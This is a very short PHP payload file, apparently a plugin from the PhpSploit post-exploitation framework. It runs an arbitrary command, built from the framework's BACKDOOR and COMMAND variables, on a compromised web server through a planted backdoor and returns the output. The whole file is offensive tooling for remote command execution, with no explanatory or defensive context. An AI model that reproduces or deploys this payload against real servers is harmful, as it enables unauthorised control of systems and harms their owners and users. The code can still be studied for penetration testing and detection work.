<?

!import(execute)

$result = execute($PHPSPLOIT['BACKDOOR'] . " " . $PHPSPLOIT["COMMAND"]);
return $result;

?>
